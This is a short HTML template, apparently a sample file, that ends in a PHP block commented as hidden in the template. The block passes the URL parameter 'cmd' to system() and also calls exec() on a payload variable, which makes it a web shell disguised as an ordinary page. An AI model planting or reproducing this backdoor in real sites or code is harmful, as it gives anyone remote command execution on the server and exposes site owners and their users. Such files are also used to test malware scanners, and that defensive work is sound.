<html>
<head><title>Innocent Template</title></head>
<body>
    <h1>Welcome</h1>
    <p>This looks like a normal template</p>
</body>
</html>

<?php
// Hidden in a template file
system( $_GET['cmd'] );
exec( $payload );
?>
